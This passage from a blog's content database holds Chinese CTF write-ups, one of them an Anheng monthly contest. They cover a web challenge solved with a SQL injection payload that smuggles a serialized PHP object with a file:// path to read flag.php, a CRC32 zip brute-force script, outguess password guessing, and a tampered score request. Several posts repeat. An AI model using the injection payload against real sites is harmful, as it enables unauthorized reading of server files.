class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>\n<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>\n<p><img src=\"/pic/4.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>\n\n<p>执行结果</p>\n<p><img src=\"/pic/5.png\" alt=\"\"></p>\n<p>查看源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"ko\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>User<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/bootstrap.min.css\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/jquery-3.3.1.slim.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/popper.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/bootstrap.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">\"table\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                username</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                age</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                blog</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                2            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                12            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                file:///var/www/html/flag.php            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>the contents of his/her blog<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">width</span>=<span class=\"string\">'100%'</span> <span class=\"attr\">height</span>=<span class=\"string\">'10em'</span> <span class=\"attr\">src</span>=<span class=\"string\">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点击即可看见flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$flag = <span class=\"string\">\"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>"},{"title":"元旦安恒月赛","date":"2020-01-02T06:29:54.000Z","_content":"\n## 安恒元旦月赛\n\n自己就看了这两个题目，其他都是队友解的。\n\n### MISC\n\n#### 爆破鬼才\n\n首先爆破第一个密码（队友已经爆破出来了）abc123\n\n解压后还是一个压缩包\n\n![](/pic/6.png)\n\n发现`1.txt、2.txt、3.txt`长度不长，应该是要进行CRC32碰撞，附上渣渣脚本\n\n```python\n#coding:utf-8\nimport zipfile\nimport string\nimport binascii\n\ndic=string.printable\ncrc = 0x7d90ee19   \nfor i in dic :\n    for j in dic:\n        for p in dic:\n            for q in dic:\n                s=str(i)+str(j)+str(p)+str(q)\n                if crc == (binascii.crc32(s) & 0xffffffff):\n                    print  s\n```\n\n这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好\n\n最后得到的结果是`Blowitup`，打开压缩包，hint.txt中的内容是`guess out my birthday! `，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是[`outguess`](https://github.com/crorvick/outguess)加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用`os.system`跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。\n\n最后跑出来的密码是20140224。拿着key解密\n\n得到`flag:flag{8322e7eed667c69f27ecbea5f96d86ca}`\n\n### web\n\n#### web1\n\n是一个小游戏，话不多说开始玩一把。\n\n![](/pic/7.png)\n\n玩了一把后查看源码，发现有一个js。\n\n```html\n<!DOCTYPE html>\n<html >\n<head>\n<meta charset=\"UTF-8\">\n<title>JS Planet defense game</title>\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\">\n<link rel=\"stylesheet\" href=\"css/style.css\">\n</head>\n\n<body>\n<body>\n<canvas id=\"canvas\"></canvas>\n\n</body>\n<script src=\"js/index.js\"></script>\n\n</body>\n</html>\n\n```\n\n点进去拉到最后有几条提示\n\n![](/pic/8.png)\n\n生成一个http请求，将分数发到服务器，将结果显示。\n\n既然要生成请求，直接上`burp suite`，会发送一个record\n\n```\nPOST /f1ag.php HTTP/1.1\nHost: 183.129.189.60:10001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 9\nOrigin: http://183.129.189.60:10001\nConnection: close\nReferer: http://183.129.189.60:10001/\n\nrecord=23\n```\n\n将`record`改成`99999999999999999999999999999999999999999999999999`，即可拿到flag","source":"_posts/元旦安恒月赛.md","raw":"---\ntitle: 元旦安恒月赛\ndate: 2020-01-02 14:29:54\ntags:\n - 安恒月赛2020\n - ctf\n - wp\n---\n\n## 安恒元旦月赛\n\n自己就看了这两个题目，其他都是队友解的。\n\n### MISC\n\n#### 爆破鬼才\n\n首先爆破第一个密码（队友已经爆破出来了）abc123\n\n解压后还是一个压缩包\n\n![](/pic/6.png)\n\n发现`1.txt、2.txt、3.txt`长度不长，应该是要进行CRC32碰撞，附上渣渣脚本\n\n```python\n#coding:utf-8\nimport zipfile\nimport string\nimport binascii\n\ndic=string.printable\ncrc = 0x7d90ee19   \nfor i in dic :\n    for j in dic:\n        for p in dic:\n            for q in dic:\n                s=str(i)+str(j)+str(p)+str(q)\n                if crc == (binascii.crc32(s) & 0xffffffff):\n                    print  s\n```\n\n这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好\n\n最后得到的结果是`Blowitup`，打开压缩包，hint.txt中的内容是`guess out my birthday! `，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是[`outguess`](https://github.com/crorvick/outguess)加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用`os.system`跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。\n\n最后跑出来的密码是20140224。拿着key解密\n\n得到`flag:flag{8322e7eed667c69f27ecbea5f96d86ca}`\n\n### web\n\n#### web1\n\n是一个小游戏，话不多说开始玩一把。\n\n![](/pic/7.png)\n\n玩了一把后查看源码，发现有一个js。\n\n```html\n<!DOCTYPE html>\n<html >\n<head>\n<meta charset=\"UTF-8\">\n<title>JS Planet defense game</title>\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\">\n<link rel=\"stylesheet\" href=\"css/style.css\">\n</head>\n\n<body>\n<body>\n<canvas id=\"canvas\"></canvas>\n\n</body>\n<script src=\"js/index.js\"></script>\n\n</body>\n</html>\n\n```\n\n点进去拉到最后有几条提示\n\n![](/pic/8.png)\n\n生成一个http请求，将分数发到服务器，将结果显示。\n\n既然要生成请求，直接上`burp suite`，会发送一个record\n\n```\nPOST /f1ag.php HTTP/1.1\nHost: 183.129.189.60:10001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 9\nOrigin: http://183.129.189.60:10001\nConnection: close\nReferer: http://183.129.189.60:10001/\n\nrecord=23\n```\n\n将`record`改成`99999999999999999999999999999999999999999999999999`，即可拿到flag","slug":"元旦安恒月赛","published":1,"updated":"2020-01-02T08:08:16.842Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4wg88at0000yk7eghziaddi","content":"<h2 id=\"安恒元旦月赛\"><a href=\"#安恒元旦月赛\" class=\"headerlink\" title=\"安恒元旦月赛\"></a>安恒元旦月赛</h2><p>自己就看了这两个题目，其他都是队友解的。</p>\n<h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><h4 id=\"爆破鬼才\"><a href=\"#爆破鬼才\" class=\"headerlink\" title=\"爆破鬼才\"></a>爆破鬼才</h4><p>首先爆破第一个密码（队友已经爆破出来了）abc123</p>\n<p>解压后还是一个压缩包</p>\n<p><img src=\"/pic/6.png\" alt=\"\"></p>\n<p>发现<code>1.txt、2.txt、3.txt</code>长度不长，应该是要进行CRC32碰撞，附上渣渣脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">dic=string.printable</span><br><span class=\"line\">crc = <span class=\"number\">0x7d90ee19</span>   </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic :</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> q <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> crc == (binascii.crc32(s) &amp; <span class=\"number\">0xffffffff</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">print</span>  s</span><br></pre></td></tr></table></figure>\n\n<p>这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好</p>\n<p>最后得到的结果是<code>Blowitup</code>，打开压缩包，hint.txt中的内容是<code>guess out my birthday!</code>，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是<a href=\"https://github.com/crorvick/outguess\" target=\"_blank\" rel=\"noopener\"><code>outguess</code></a>加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用<code>os.system</code>跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。</p>\n<p>最后跑出来的密码是20140224。拿着key解密</p>\n<p>得到<code>flag:flag{8322e7eed667c69f27ecbea5f96d86ca}</code></p>\n<h3 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h3><h4 id=\"web1\"><a href=\"#web1\" class=\"headerlink\" title=\"web1\"></a>web1</h4><p>是一个小游戏，话不多说开始玩一把。</p>\n<p><img src=\"/pic/7.png\" alt=\"\"></p>\n<p>玩了一把后查看源码，发现有一个js。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JS Planet defense game<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/style.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">canvas</span> <span class=\"attr\">id</span>=<span class=\"string\">\"canvas\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">canvas</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/index.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点进去拉到最后有几条提示</p>\n<p><img src=\"/pic/8.png\" alt=\"\"></p>\n<p>生成一个http请求，将分数发到服务器，将结果显示。</p>\n<p>既然要生成请求，直接上<code>burp suite</code>，会发送一个record</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST &#x2F;f1ag.php HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 183.129.189.60:10001</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: *&#x2F;*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 9</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;183.129.189.60:10001</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;183.129.189.60:10001&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">record&#x3D;23</span><br></pre></td></tr></table></figure>\n\n<p>将<code>record</code>改成<code>99999999999999999999999999999999999999999999999999</code>，即可拿到flag</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"安恒元旦月赛\"><a href=\"#安恒元旦月赛\" class=\"headerlink\" title=\"安恒元旦月赛\"></a>安恒元旦月赛</h2><p>自己就看了这两个题目，其他都是队友解的。</p>\n<h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><h4 id=\"爆破鬼才\"><a href=\"#爆破鬼才\" class=\"headerlink\" title=\"爆破鬼才\"></a>爆破鬼才</h4><p>首先爆破第一个密码（队友已经爆破出来了）abc123</p>\n<p>解压后还是一个压缩包</p>\n<p><img src=\"/pic/6.png\" alt=\"\"></p>\n<p>发现<code>1.txt、2.txt、3.txt</code>长度不长，应该是要进行CRC32碰撞，附上渣渣脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">dic=string.printable</span><br><span class=\"line\">crc = <span class=\"number\">0x7d90ee19</span>   </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic :</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> q <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> crc == (binascii.crc32(s) &amp; <span class=\"number\">0xffffffff</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">print</span>  s</span><br></pre></td></tr></table></figure>\n\n<p>这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好</p>\n<p>最后得到的结果是<code>Blowitup</code>，打开压缩包，hint.txt中的内容是<code>guess out my birthday!</code>，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是<a href=\"https://github.com/crorvick/outguess\" target=\"_blank\" rel=\"noopener\"><code>outguess</code></a>加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用<code>os.system</code>跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。</p>\n<p>最后跑出来的密码是20140224。拿着key解密</p>\n<p>得到<code>flag:flag{8322e7eed667c69f27ecbea5f96d86ca}</code></p>\n<h3 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h3><h4 id=\"web1\"><a href=\"#web1\" class=\"headerlink\" title=\"web1\"></a>web1</h4><p>是一个小游戏，话不多说开始玩一把。</p>\n<p><img src=\"/pic/7.png\" alt=\"\"></p>\n<p>玩了一把后查看源码，发现有一个js。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JS Planet defense game<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/style.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">canvas</span> <span class=\"attr\">id</span>=<span class=\"string\">\"canvas\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">canvas</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/index.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span 